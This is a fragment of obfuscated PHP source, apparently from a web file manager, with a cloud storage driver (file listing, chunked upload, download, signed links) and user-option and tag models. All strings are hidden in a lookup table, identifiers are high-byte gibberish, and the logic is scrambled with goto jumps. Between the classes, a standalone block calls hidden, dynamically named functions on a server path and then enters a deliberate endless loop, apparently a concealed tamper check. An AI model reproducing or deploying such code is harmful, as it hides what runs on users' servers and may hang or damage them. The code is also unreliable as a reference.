$EáÛ±Úë÷ =& $_SERVER[¹Ò‹Ò¹]; $c®¼¹è„“‡ = array($EáÛ±Úë÷[28] => $this->pathThis($b„ì²è–²Š), $EáÛ±Úë÷[75] => $this->getPathOuter($EáÛ±Úë÷[8] . $b„ì²è–²Š), $EáÛ±Úë÷[29] => $EáÛ±Úë÷[191], $EáÛ±Úë÷[77] => isset($f÷ÒòêÂ°Û[$EáÛ±Úë÷[77]]) ? $f÷ÒòêÂ°Û[$EáÛ±Úë÷[77]] : 0, $EáÛ±Úë÷[167] => $this->ext($b„ì²è–²Š)); if ($A‹–ƒ†Ò™­) { return $c®¼¹è„“‡; } goto FŸ•¢ŒÀ­; f×Î‘÷•öò: } public function folderInfo($DÈª¬©æ¤¾, $Bå—‚èá‹â = false) { goto añŒ£Ò†¨‚; fÅÜö‘é¸”: $a’©¡àœá[$F½”˜Ó£„Ô[192]] = $a’©¡àœá[$F½”˜Ó£„Ô[83]] = 0; $a’©¡àœá[$F½”˜Ó£„Ô[193]] = $a’©¡àœá[$F½”˜Ó£„Ô[194]] = !0; if (empty($CË‚À­)) { $CË‚À­ = $this->objectMeta($DÈª¬©æ¤¾); if (!$CË‚À­) { return $a’©¡àœá; } } goto DÅµÚ®¯•ä; añŒ£Ò†¨‚: $F½”˜Ó£„Ô =& $_SERVER[¹Ò‹Ò¹]; $a’©¡àœá = array($F½”˜Ó£„Ô[28] => $this->pathThis($DÈª¬©æ¤¾), $F½”˜Ó£„Ô[75] => $this->getPathOuter($F½”˜Ó£„Ô[8] . $DÈª¬©æ¤¾), $F½”˜Ó£„Ô[29] => $F½”˜Ó£„Ô[76]); if ($Bå—‚èá‹â) { return $a’©¡àœá; } goto fÅÜö‘é¸”; DÅµÚ®¯•ä: $a’©¡àœá[$F½”˜Ó£„Ô[192]] = intval($CË‚À­[$F½”˜Ó£„Ô[1316]]); $a’©¡àœá[$F½”˜Ó£„Ô[83]] = intval($CË‚À­[$F½”˜Ó£„Ô[1317]]); return $a’©¡àœá; goto A÷‘í‚Ô; A÷‘í‚Ô: } private function listObjs($A¥¼‘ë¾­, $cÑÇÊÓ¼Ã¨ = 0, $AË¾¬ƒí†ã = 1000) { $c˜§¾£Íéä =& $_SERVER[¹Ò‹Ò¹]; $eƒ§öè¬­¶ = array($c˜§¾£Íéä[1318], $c˜§¾£Íéä[1319] . $AË¾¬ƒí†ã); if ($cÑÇÊÓ¼Ã¨) { $eƒ§öè¬­¶[] = $c˜§¾£Íéä[1320] . $cÑÇÊÓ¼Ã¨; } $b‹ÏÃ¼â = $this->ussRequest($A¥¼‘ë¾­, $c˜§¾£Íéä[226], !1, $eƒ§öè¬­¶); return !$b‹ÏÃ¼â[$c˜§¾£Íéä[1061]] ? !1 : $b‹ÏÃ¼â[$c˜§¾£Íéä[1063]]; } private function fileList($A¸ŒƒùĞŞè, &$E„®ºà‹ÄŠ, &$DØ‡›Œˆóî, $b®’½›Æ«Á = false) { goto E¶£†ÁÀ¯¹; cÏØ…éìÍË: $BòÏŸ×Ÿ—í = rtrim($A¸ŒƒùĞŞè, $eõõğ·øÔ£[8]) . $eõõğ·øÔ£[8]; $FÕÂ‹ğİ¨« = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $a£‰¾®İ½ = $this->listObjs($A¸ŒƒùĞŞè, $Dß…‡Ñ´à, $a¦”‰Ÿ¶ˆ); if (!$a£‰¾®İ½) { return !1; } $Dß…‡Ñ´à = isset($a£‰¾®İ½[$eõõğ·øÔ£[1321]]) ? $a£‰¾®İ½[$eõõğ·øÔ£[1321]] : $eõõğ·øÔ£[33]; $B…›—™«ÕŠ = isset($a£‰¾®İ½[$eõõğ·øÔ£[1322]]) ? $a£‰¾®İ½[$eõõğ·øÔ£[1322]] : array(); foreach ($B…›—™«ÕŠ as $dÆœÄ¸ïì¥) { $CˆëÏõšñ = $dÆœÄ¸ïì¥[$eõõğ·øÔ£[29]] == $eõõğ·øÔ£[76] ? !0 : !1; $d¨šÑÑË½ = ltrim($BòÏŸ×Ÿ—í . $dÆœÄ¸ïì¥[$eõõğ·øÔ£[28]], $eõõğ·øÔ£[8]) . ($CˆëÏõšñ ? $eõõğ·øÔ£[8] : $eõõğ·øÔ£[33]); $a¡¬¤È‹ã¸ = array($eõõğ·øÔ£[28] => $d¨šÑÑË½, $eõõğ·øÔ£[29] => $CˆëÏõšñ ? $eõõğ·øÔ£[76] : $eõõğ·øÔ£[191], $eõõğ·øÔ£[77] => $dÆœÄ¸ïì¥[$eõõğ·øÔ£[333]], $eõõğ·øÔ£[1317] => $dÆœÄ¸ïì¥[$eõõğ·øÔ£[1323]]); if ($FÕÂ‹ğİ¨«) { $this->cacheMethod($eõõğ·øÔ£[197], $d¨šÑÑË½, $CˆëÏõšñ); $this->cacheMethod($eõõğ·øÔ£[198], $d¨šÑÑË½, $a¡¬¤È‹ã¸); } if ($CˆëÏõšñ) { $E„®ºà‹ÄŠ[] = $d¨šÑÑË½; if ($b®’½›Æ«Á) { $this->fileList($d¨šÑÑË½, $E„®ºà‹ÄŠ, $DØ‡›Œˆóî, $b®’½›Æ«Á); } continue; } $DØ‡›Œˆóî[] = $a¡¬¤È‹ã¸; } if (count($B…›—™«ÕŠ) < $a¦”‰Ÿ¶ˆ) { break; } } goto dßö«‰åäó; E¶£†ÁÀ¯¹: $eõõğ·øÔ£ =& $_SERVER[¹Ò‹Ò¹]; $Dß…‡Ñ´à = $eõõğ·øÔ£[33]; $a¦”‰Ÿ¶ˆ = 1000; goto cÏØ…éìÍË; dßö«‰åäó: if ($FÕÂ‹ğİ¨«) { $this->cacheMethod($eõõğ·øÔ£[197], $A¸ŒƒùĞŞè, !0); } goto FŠô¤È†©À; FŠô¤È†©À: } public function listPath($EµÍëÜË¨‰, $AÙ›Ğ›¹‰å = false) { $Cˆ Ññ„Œ =& $_SERVER[¹Ò‹Ò¹]; $fÕˆ‹õÕ„Õ = $EŒ¡¹‚ã“æ = array(); $this->fileList($EµÍëÜË¨‰, $fÕˆ‹õÕ„Õ, $EŒ¡¹‚ã“æ); foreach ($fÕˆ‹õÕ„Õ as $FĞ•Ï¤‰õİ => $BÍÓíó¢æò) { $fÕˆ‹õÕ„Õ[$FĞ•Ï¤‰õİ] = $this->folderInfo($BÍÓíó¢æò, $AÙ›Ğ›¹‰å); } foreach ($EŒ¡¹‚ã“æ as $FĞ•Ï¤‰õİ => $BÍÓíó¢æò) { $EŒ¡¹‚ã“æ[$FĞ•Ï¤‰õİ] = $this->fileInfo($BÍÓíó¢æò[$Cˆ Ññ„Œ[28]], $AÙ›Ğ›¹‰å, $BÍÓíó¢æò); } return array($Cˆ Ññ„Œ[74] => $fÕˆ‹õÕ„Õ, $Cˆ Ññ„Œ[73] => $EŒ¡¹‚ã“æ); } public function has($CÃµ¨®¡¯Õ, $fÏîÅô¿Ò“ = false, $C”ÒĞóäè¯ = true) { goto B•ßÖß£áµ; AÙš†œËÕ: while (!0) { check_abort(); $b´ØˆÉïÌ› = $this->listObjs($CÃµ¨®¡¯Õ, $D‹•ä…İš», $Bö¥Åî‚ğ); if (!$b´ØˆÉïÌ›) { return !1; } $D‹•ä…İš» = isset($b´ØˆÉïÌ›[$e»‰¹ä³ù[1321]]) ? $b´ØˆÉïÌ›[$e»‰¹ä³ù[1321]] : $e»‰¹ä³ù[33]; $A‰¿Ïí£˜Ë = isset($b´ØˆÉïÌ›[$e»‰¹ä³ù[1322]]) ? $b´ØˆÉïÌ›[$e»‰¹ä³ù[1322]] : array(); if (empty($A‰¿Ïí£˜Ë)) { break; } $B‡„¾‰Ï˜ = array_filter($A‰¿Ïí£˜Ë, function ($dô¿½Éø ß) { $eÆ¾±Õõñ =& $_SERVER[¹Ò‹Ò¹]; return $dô¿½Éø ß[$eÆ¾±Õõñ[29]] == $eÆ¾±Õõñ[76]; }); $d‘¦î ŒƒŠ = count($A‰¿Ïí£˜Ë); $B‡„¾‰Ï˜ = count($B‡„¾‰Ï˜); $DÍô”áÑé = $d‘¦î ŒƒŠ - $B‡„¾‰Ï˜; if ($fÏîÅô¿Ò“) { $d»—ÍÁ‘ÙÎ += $B‡„¾‰Ï˜; $cÂª®¸òÕ += $DÍô”áÑé; if ($d‘¦î ŒƒŠ < $Bö¥Åî‚ğ) { break; } continue; } if ($C”ÒĞóäè¯) { if ($DÍô”áÑé) { return !0; } } else { if ($B‡„¾‰Ï˜) { return !0; } } if ($d‘¦î ŒƒŠ < $Bö¥Åî‚ğ) { break; } } if ($fÏîÅô¿Ò“) { return array($e»‰¹ä³ù[201] => $cÂª®¸òÕ, $e»‰¹ä³ù[202] => $d»—ÍÁ‘ÙÎ); } return !1; goto A¥î¦ßâ•æ; d½‚“—Ÿ: $cÂª®¸òÕ = 0; $d»—ÍÁ‘ÙÎ = 0; $D±Ğˆ·š = rtrim($CÃµ¨®¡¯Õ, $e»‰¹ä³ù[8]) . $e»‰¹ä³ù[8]; goto AÙš†œËÕ; B•ßÖß£áµ: $e»‰¹ä³ù =& $_SERVER[¹Ò‹Ò¹]; $D‹•ä…İš» = $e»‰¹ä³ù[33]; $Bö¥Åî‚ğ = 500; goto d½‚“—Ÿ; A¥î¦ßâ•æ: } public function listAll($b£ç¯¤©†‡) { goto dõñÔ†£âæ; dõñÔ†£âæ: $d¦âÌæèÏ =& $_SERVER[¹Ò‹Ò¹]; $Aåõ¬ì”»ï = $E³†÷”ªÖ  = array(); $this->fileList($b£ç¯¤©†‡, $Aåõ¬ì”»ï, $E³†÷”ªÖ , !0); goto FÙÌ³²·»ˆ; FÙÌ³²·»ˆ: $cäÁ²‚ßÜå = array(); foreach ($E³†÷”ªÖ  as $D»ÉÌ¯›‚›) { $cäÁ²‚ßÜå[$D»ÉÌ¯›‚›[$d¦âÌæèÏ[28]]] = $D»ÉÌ¯›‚›[$d¦âÌæèÏ[77]]; } foreach ($Aåõ¬ì”»ï as $D»ÉÌ¯›‚›) { if (is_string($D»ÉÌ¯›‚›)) { $cäÁ²‚ßÜå[$D»ÉÌ¯›‚›] = 0; } } goto C‘ô¤ß³“¶; C‘ô¤ß³“¶: return $this->listAllFiles($b£ç¯¤©†‡, array_keys($cäÁ²‚ßÜå), $cäÁ²‚ßÜå); goto B†ËÖ»®ö; B†ËÖ»®ö: } public function canRead($A–ãøª£ÅÈ) { return $this->exist($A–ãøª£ÅÈ) ? !0 : !1; } public function canWrite($DÖÙÆƒ˜î) { return $this->exist($DÖÙÆƒ˜î) ? !0 : !1; } public function getContent($A½Õ‹¢æÁ) { return $this->fileSubstr($A½Õ‹¢æÁ, 0, -1); } public function setContent($F•’êàÜ…ˆ, $b¥××Ë¨¶ò = '') { $bìÊ±øéæ‰ =& $_SERVER[¹Ò‹Ò¹]; if (!$b¥××Ë¨¶ò) { $cá­¢ÉÇ…É = $this->ussRequest($F•’êàÜ…ˆ, $bìÊ±øéæ‰[222]); return $cá­¢ÉÇ…É[$bìÊ±øéæ‰[1061]]; } $d‰ĞÜ‚â’È = $this->tempFile($this->pathThis($F•’êàÜ…ˆ)); file_put_contents($d‰ĞÜ‚â’È, $b¥××Ë¨¶ò); if ($this->upload($F•’êàÜ…ˆ, $d‰ĞÜ‚â’È)) { $this->tempFileRemve($d‰ĞÜ‚â’È); return !0; } return !1; } public function fileSubstr($B÷¬òÍéŒ†, $cƒØ–¹¶Ùö, $F¦ª²Â„·ª) { $EñëØÅ¾Âï =& $_SERVER[¹Ò‹Ò¹]; if (!($Cºº‚Ë…œ = $this->link($B÷¬òÍéŒ†))) { return !1; } $BšŠ¦¿áÌ» = !1; if ($F¦ª²Â„·ª > 0) { $EÁáƒõ¯©ƒ = $cƒØ–¹¶Ùö + $F¦ª²Â„·ª - 1; $BšŠ¦¿áÌ» = array($EñëØÅ¾Âï[1284] . $cƒØ–¹¶Ùö . $EñëØÅ¾Âï[434] . $EÁáƒõ¯©ƒ); } $Cñ¤‚Ïê‰¶ = url_request($Cºº‚Ë…œ, $EñëØÅ¾Âï[226], !1, $BšŠ¦¿áÌ»); return $Cñ¤‚Ïê‰¶[$EñëØÅ¾Âï[704]] ? $Cñ¤‚Ïê‰¶[$EñëØÅ¾Âï[1063]] : !1; } public function upload($aÅ­«×ÆÊÖ, $aÊÛ¡ø‰Ø¤, $bŸ÷”¥Á¢‹ = false, $FœŒ¢«†™· = REPEAT_REPLACE) { goto Aƒê‘÷­ãÉ; fèÚÅ†Šì¶: $f¯¯¯Ú«Øå = 1024 * 1024 * 10; $Fõˆñ¥”Üî = array($FßñõÀâµƒ[1325], $FßñõÀâµƒ[1326] . $AÜ„®¯´, $FßñõÀâµƒ[1327], $FßñõÀâµƒ[1328] . $f¯¯¯Ú«Øå); $Fœ ¯†Úªõ = $this->ussRequest($aÅ­«×ÆÊÖ, $FßñõÀâµƒ[224], !1, $Fõˆñ¥”Üî); goto C“ò…ï—ÙÛ; FËÅù°ôˆ: do { $d¿ÈåÆ•¥¿ = $b²—õ¼»ì[$FßñõÀâµƒ[1330]]; fseek_64($A–ˆ‹ï‰Ÿ», $cô—æ¯Š); $f›ÏÄµá‹ = fread($A–ˆ‹ï‰Ÿ», $d¿ÈåÆ•¥¿); $d°ëÑÂÚ¶¶ = 0; do { $d°ëÑÂÚ¶¶++; $b²—õ¼»ì = $this->uploadPart($aÅ­«×ÆÊÖ, $b²—õ¼»ì, $f›ÏÄµá‹); } while (!$b²—õ¼»ì && $d°ëÑÂÚ¶¶ < 3); if (!$b²—õ¼»ì) { return !1; } $bÁí²ÚÓå» = $b²—õ¼»ì[$FßñõÀâµƒ[1329]]; $cô—æ¯Š += $d¿ÈåÆ•¥¿; } while ($bÁí²ÚÓå» != -1); fclose($A–ˆ‹ï‰Ÿ»); $Fõˆñ¥”Üî = array($FßñõÀâµƒ[1331], $FßñõÀâµƒ[1332] . $b²—õ¼»ì[$FßñõÀâµƒ[1333]], $FßñõÀâµƒ[1327]); goto FÙçß¼ĞÆš; FÙçß¼ĞÆš: $Fœ ¯†Úªõ = $this->ussRequest($aÅ­«×ÆÊÖ, $FßñõÀâµƒ[224], !1, $Fõˆñ¥”Üî); return $Fœ ¯†Úªõ[$FßñõÀâµƒ[1061]] ? $this->getPathOuter($EùØÕôõ®) : !1; goto Bæ¯ôßµ·Á; C“ò…ï—ÙÛ: if (!$Fœ ¯†Úªõ[$FßñõÀâµƒ[1061]]) { return !1; } $b²—õ¼»ì = $Fœ ¯†Úªõ[$FßñõÀâµƒ[1063]]; $cô—æ¯Š = 0; goto Cªœ·Ú±; Cªœ·Ú±: $bÁí²ÚÓå» = $b²—õ¼»ì[$FßñõÀâµƒ[1329]]; $A–ˆ‹ï‰Ÿ» = fopen($aÊÛ¡ø‰Ø¤, $FßñõÀâµƒ[1234]); if (!$A–ˆ‹ï‰Ÿ») { return !1; } goto FËÅù°ôˆ; Aƒê‘÷­ãÉ: $FßñõÀâµƒ =& $_SERVER[¹Ò‹Ò¹]; $AÜ„®¯´ = IO::size($aÊÛ¡ø‰Ø¤); if ($AÜ„®¯´ <= 1024 * 1024 * 200) { $C‡»¼á¸§ = array($FßñõÀâµƒ[1324] . $aÊÛ¡ø‰Ø¤); $Fœ ¯†Úªõ = $this->ussRequest($aÅ­«×ÆÊÖ, $FßñõÀâµƒ[224], $C‡»¼á¸§); return $Fœ ¯†Úªõ[$FßñõÀâµƒ[1061]] ? $this->getPathOuter($aÅ­«×ÆÊÖ) : !1; } goto fèÚÅ†Šì¶; Bæ¯ôßµ·Á: } private function uploadPart($DÉŠ”À´”, $fš·¬¯‡ô¬, &$A„›ñŒ´Ú) { $A¢ƒšàƒ†Ù =& $_SERVER[¹Ò‹Ò¹]; $dãÄòçÉ¥É = array($A¢ƒšàƒ†Ù[1334], $A¢ƒšàƒ†Ù[1332] . $fš·¬¯‡ô¬[$A¢ƒšàƒ†Ù[1333]], $A¢ƒšàƒ†Ù[1335] . $fš·¬¯‡ô¬[$A¢ƒšàƒ†Ù[1329]], $A¢ƒšàƒ†Ù[140] . $fš·¬¯‡ô¬[$A¢ƒšàƒ†Ù[1330]]); $bÛ‰¡ÅÌ  = $this->ussRequest($DÉŠ”À´”, $A¢ƒšàƒ†Ù[224], $A„›ñŒ´Ú, $dãÄòçÉ¥É); return !$bÛ‰¡ÅÌ [$A¢ƒšàƒ†Ù[1061]] ? $bÛ‰¡ÅÌ [$A¢ƒšàƒ†Ù[1061]] : $bÛ‰¡ÅÌ [$A¢ƒšàƒ†Ù[1063]]; } public function uploadFormData($a…øÏËÍŞÕ, $Cö”ªˆ´¼Ñ = 3600) { return $this->uploadPolicy($a…øÏËÍŞÕ, $Cö”ªˆ´¼Ñ); } public function multiUploadFormData($EîØÃ”Òš´, $Cá¶¯õñ = 3600) { $f†ŒöƒîË =& $_SERVER[¹Ò‹Ò¹]; $DÔĞ«à…ˆô = (int) $GLOBALS[$f†ŒöƒîË[7]][$f†ŒöƒîË[77]]; return $this->uploadPolicy($EîØÃ”Òš´, $Cá¶¯õñ, $DÔĞ«à…ˆô); } private function uploadPolicy($B£š‡ŸÛá, $dÔ®¨»¨ÒÆ = 3600, $B¯•¿ó…×× = 0) { goto D“¸ê‘®Â„; c³òÆÖ«¿: $E¡í³…¼ÀŸ = base64_encode(hash_hmac($C“ØŒ»Ğø¸[1306], "\x50\117\123\x54\46{$C’¸‚´òî£}\46{$bĞÁ”†Æ‡}\x26{$E˜¦Æäöì‡}", md5("{$this->userpass}"), !0)); $b ¬²ÂØÚ = array($C“ØŒ»Ğø¸[1174] => $E˜¦Æäöì‡, $C“ØŒ»Ğø¸[1340] => "\x55\120\x59\125\116\40{$this->username}\x3a{$E¡í³…¼ÀŸ}", $C“ØŒ»Ğø¸[174] => $this->endpoint . $C’¸‚´òî£); return $b ¬²ÂØÚ; goto bÎ »¸©¶É; DóÕ˜¾ÆŠî: $AÙÆ“À À = array($C“ØŒ»Ğø¸[1336] => $this->bucket, $C“ØŒ»Ğø¸[1337] => $B£š‡ŸÛá, $C“ØŒ»Ğø¸[1338] => time() + $dÔ®¨»¨ÒÆ, $C“ØŒ»Ğø¸[1339] => $bĞÁ”†Æ‡); if ($B¯•¿ó…××) { $AÙÆ“À À[$C“ØŒ»Ğø¸[1250]] = $B¯•¿ó…××; } $E˜¦Æäöì‡ = base64_encode(json_encode($AÙÆ“À À)); goto c³òÆÖ«¿; D“¸ê‘®Â„: $C“ØŒ»Ğø¸ =& $_SERVER[¹Ò‹Ò¹]; $C’¸‚´òî£ = $C“ØŒ»Ğø¸[8] . $this->bucket; $bĞÁ”†Æ‡ = gmdate($C“ØŒ»Ğø¸[1271]); goto DóÕ˜¾ÆŠî; bÎ »¸©¶É: } public function download($cİ—Œ®ìí, $FíÙ­ÎÕĞ) { goto FáäÄó­Õ; Aå‹ä‚¡„: $cƒ†¡ÉŠ†… = 1024 * 200; $b„À¿‡Ö œ = fopen($dÛ˜©À©±, $_SERVER[¹Ò‹Ò¹][1290]); while (!0) { $BàÜ©ä¸Ñë = $this->fileSubstr($cİ—Œ®ìí, $dÁí­·¾Â, $cƒ†¡ÉŠ†…); if ($BàÜ©ä¸Ñë === !1) { return !1; } fwrite($b„À¿‡Ö œ, $BàÜ©ä¸Ñë); $dÁí­·¾Â += $cƒ†¡ÉŠ†…; if (strlen($BàÜ©ä¸Ñë) < $cƒ†¡ÉŠ†…) { break; } } goto fÂ·®îâê; FáäÄó­Õ: $dÛ˜©À©± = IO::getPathInner(IO::mkfile($FíÙ­ÎÕĞ)); if (!($e²Æ…˜„î‹ = $this->link($cİ—Œ®ìí))) { return !1; } $dÁí­·¾Â = 0; goto Aå‹ä‚¡„; fÂ·®îâê: fclose($b„À¿‡Ö œ); return $FíÙ­ÎÕĞ; goto CÓ¡Òé™ÍÍ; CÓ¡Òé™ÍÍ: } public function link($eµË… ¢òÉ, $Bˆ…´ã˜˜£ = array()) { $c§Ä×±Ñ­Î =& $_SERVER[¹Ò‹Ò¹]; $eµË… ¢òÉ = trim($eµË… ¢òÉ, $c§Ä×±Ñ­Î[8]); if (!empty($this->token)) { $Eöøƒ·ì = strtotime(date($c§Ä×±Ñ­Î[1341])); $e†ÂéÇƒÃ„ = substr(md5($this->token . $c§Ä×±Ñ­Î[280] . $Eöøƒ·ì . $c§Ä×±Ñ­Î[1342] . $eµË… ¢òÉ), 12, 8) . $Eöøƒ·ì; $Bˆ…´ã˜˜£[] = $c§Ä×±Ñ­Î[1343] . $e†ÂéÇƒÃ„; } $eÈÏÁÏö® = !empty($Bˆ…´ã˜˜£) ? $c§Ä×±Ñ­Î[69] . implode($c§Ä×±Ñ­Î[280], $Bˆ…´ã˜˜£) : $c§Ä×±Ñ­Î[33]; return $this->getHost() . $c§Ä×±Ñ­Î[8] . $eµË… ¢òÉ . $eÈÏÁÏö®; } public function fileOut($A´Óáµ¶ğ”, $B‹ôŞÈô¿¾ = false, $f‘è–Ÿœ¾ì = false, $C´¥÷·“¬ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($A´Óáµ¶ğ”, $B‹ôŞÈô¿¾, $f‘è–Ÿœ¾ì, $C´¥÷·“¬); } if (!$f‘è–Ÿœ¾ì) { $f‘è–Ÿœ¾ì = $this->pathThis($A´Óáµ¶ğ”); } $E—ïéÅ¡Ë¾ = $B‹ôŞÈô¿¾ ? array($_SERVER[¹Ò‹Ò¹][1344] . rawurlencode($f‘è–Ÿœ¾ì)) : array(); $FŞÌ‹Æ£æ´ = $this->link($A´Óáµ¶ğ”, $E—ïéÅ¡Ë¾); $this->fileOutLink($FŞÌ‹Æ£æ´); } public function fileOutServer($eæÇÆ¦âŞá, $aêˆŠˆà‰ = false, $C´Şø¤¸åÈ = false, $bŠ›»ãĞ· = '') { parent::fileOut($eæÇÆ¦âŞá, $aêˆŠˆà‰, $C´Şø¤¸åÈ, $bŠ›»ãĞ·); } public function fileOutImage($b¦À·òŒù, $F‰„˜‹©ßÛ = 250) { $b‰¤Œì°®´ = $this->link($b¦À·òŒù . $_SERVER[¹Ò‹Ò¹][1345] . $F‰„˜‹©ßÛ); $this->fileOutLink($b‰¤Œì°®´); } public function fileOutImageServer($dÍ’„Í´ÇÁ, $f˜÷ÉŞ‰Ã = 250) { parent::fileOutImage($dÍ’„Í´ÇÁ, $f˜÷ÉŞ‰Ã); } public function hashMd5($F¹´³Ó÷è¿) { $C…Â¶‡¬¬ =& $_SERVER[¹Ò‹Ò¹]; $C¬‘›ŠÊêØ = $this->_objectMeta($F¹´³Ó÷è¿); return isset($C¬‘›ŠÊêØ[$C…Â¶‡¬¬[206]]) ? $C¬‘›ŠÊêØ[$C…Â¶‡¬¬[206]] : !1; } public function size($eÎ¥½‘’) { $E™ŠÔÔÉì¡ = $this->objectMeta($eÎ¥½‘’); return $E™ŠÔÔÉì¡ ? $E™ŠÔÔÉì¡[$_SERVER[¹Ò‹Ò¹][77]] : 0; } public function info($FÜ®ò…•Ó—) { if ($this->isFolder($FÜ®ò…•Ó—)) { return $this->folderInfo($FÜ®ò…•Ó—); } else { if ($this->isFile($FÜ®ò…•Ó—)) { return $this->fileInfo($FÜ®ò…•Ó—); } } return !1; } public function exist($fÏ Ë‡ùŞ) { return $this->isFile($fÏ Ë‡ùŞ) || $this->isFolder($fÏ Ë‡ùŞ); } public function isFile($dµ³»ÙÁñ©) { return !$this->isFolder($dµ³»ÙÁñ©) && $this->objectMeta($dµ³»ÙÁñ©); } public function isFolder($fòÃœ³‘á) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][197], $fòÃœ³‘á); } protected function objectMeta($d¬ôˆ®‘¹Ê) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][198], $d¬ôˆ®‘¹Ê); } protected function _objectMeta($f¿“ßáÛèŸ) { goto FäšÇÇ‡îí; eÜç›Ê¥’¡: if (!$F‹óÑâ’Ó÷[$F„ğ‡ìÚ‹[1061]]) { return null; } $BôÇ˜Å®Ö› = isset($F‹óÑâ’Ó÷[$F„ğ‡ìÚ‹[1063]]) ? $F‹óÑâ’Ó÷[$F„ğ‡ìÚ‹[1063]] : array(); if (!isset($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1347]])) { return null; } goto C‡ğê–çäˆ; C‡ğê–çäˆ: $CÜŸéÒ¼Œã = array($F„ğ‡ìÚ‹[29] => isset($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1347]]) ? $BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1347]] : null, $F„ğ‡ìÚ‹[77] => isset($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1348]]) ? $BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1348]] : null, $F„ğ‡ìÚ‹[206] => isset($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1349]]) ? $BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1349]] : null, $F„ğ‡ìÚ‹[1316] => isset($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1350]]) ? $BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1350]] : null); $CÜŸéÒ¼Œã[$F„ğ‡ìÚ‹[1317]] = isset($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1351]]) ? strtotime($BôÇ˜Å®Ö›[$F„ğ‡ìÚ‹[1351]]) : $CÜŸéÒ¼Œã[$F„ğ‡ìÚ‹[1316]]; return $CÜŸéÒ¼Œã; goto dŸŒ”„òº; FäšÇÇ‡îí: $F„ğ‡ìÚ‹ =& $_SERVER[¹Ò‹Ò¹]; if ($f¿“ßáÛèŸ == $F„ğ‡ìÚ‹[33] || $f¿“ßáÛèŸ == $F„ğ‡ìÚ‹[8]) { return array(); } $F‹óÑâ’Ó÷ = $this->ussRequest($f¿“ßáÛèŸ, $F„ğ‡ìÚ‹[1346]); goto eÜç›Ê¥’¡; dŸŒ”„òº: } protected function _isFolder($c™ê‘ö˜Óõ) { $e´…æ†Ç‚£ =& $_SERVER[¹Ò‹Ò¹]; if ($c™ê‘ö˜Óõ == $e´…æ†Ç‚£[33] || $c™ê‘ö˜Óõ == $e´…æ†Ç‚£[8]) { return !0; } $fª·õ¸“Ñ¤ = $this->_objectMeta($c™ê‘ö˜Óõ); return isset($fª·õ¸“Ñ¤[$e´…æ†Ç‚£[29]]) && $fª·õ¸“Ñ¤[$e´…æ†Ç‚£[29]] == $e´…æ†Ç‚£[76] ? !0 : !1; } } goto bã»Öø‹; e¦àáÛÖÉ: if (!isset($_SERVER[$_SERVER[¹Ò‹Ò¹][800]]) || !isset($_SERVER[$_SERVER[¹Ò‹Ò¹][801]])) { goto fîˆ¢ëö˜; fîˆ¢ëö˜: $c®ÁÜš¥ÒØ = $_SERVER[¹Ò‹Ò¹][802]; $C‘•Ò•Œ = $_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]; $d‘ĞÁµ„ÌÎ = $c®ÁÜš¥ÒØ($C‘•Ò•Œ); goto CŞ‘ä½˜‘; CŞ‘ä½˜‘: $fÖ‡Ø×—Ë = explode($_SERVER[¹Ò‹Ò¹][227], $d‘ĞÁµ„ÌÎ); if (count($fÖ‡Ø×—Ë) < $_SERVER[¹Ò‹Ò¹][592]) { $cßóÔ×Â¯É = $_SERVER[¹Ò‹Ò¹][805]; $cßóÔ×Â¯É(); } $b…æÀİ˜Ï = $_SERVER[¹Ò‹Ò¹][806]; goto DÏ—Î¦…ğã; DÏ—Î¦…ğã: $b…æÀİ˜Ï($_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]); $CÎ§Ì¼¶çÍ = 2; while ($CÎ§Ì¼¶çÍ > 1) { $d¶Ô¸ëŞ¾º = rawurlencode($CÎ§Ì¼¶çÍ . $_SERVER[¹Ò‹Ò¹][373]); } goto b‹îğ±ËËî; b‹îğ±ËËî: } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A Áóõ™ß‹) { $bÚ¶õ±—ê =& $_SERVER[¹Ò‹Ò¹]; if (!defined($bÚ¶õ±—ê[448])) { define($bÚ¶õ±—ê[448], 0); } return "\x55\x73\145\162\117\x70\x74\x69\x6f\156\137{$A Áóõ™ß‹}\137" . USER_ID; } protected function filterWhere($eéº´ÍŸ) { $c…¾°¿¤ªŞ =& $_SERVER[¹Ò‹Ò¹]; if (!defined($c…¾°¿¤ªŞ[448])) { define($c…¾°¿¤ªŞ[448], 0); } $eéº´ÍŸ[$c…¾°¿¤ªŞ[1504]] = USER_ID; return $eéº´ÍŸ; } public function cacheRemoveUser($F½ŸÓÚÃíÚ, $f˜Ö†áÊİÄ) { return Cache::remove("\x55\x73\x65\162\x4f\160\x74\151\157\x6e\x5f{$F½ŸÓÚÃíÚ}\137" . $f˜Ö†áÊİÄ); } protected function optionDefault($fĞ‚Û¿öîá = '') { $E‰ƒßÏ¡ˆÜ =& $_SERVER[¹Ò‹Ò¹]; if ($fĞ‚Û¿öîá == $E‰ƒßÏ¡ˆÜ[33]) { return $GLOBALS[$E‰ƒßÏ¡ˆÜ[6]][$E‰ƒßÏ¡ˆÜ[2137]]; } if ($fĞ‚Û¿öîá == $E‰ƒßÏ¡ˆÜ[2138]) { return $GLOBALS[$E‰ƒßÏ¡ˆÜ[6]][$E‰ƒßÏ¡ˆÜ[2139]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\x2e\x74\141\x67\114\x69\163\164"; public $modelType = "\125\163\x65\162\117\160\164\151\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\163\x74\x79\154\x65", "\163\x6f\x72\x74"); public function listData($aâÎ¤ÖŞÅ = false, 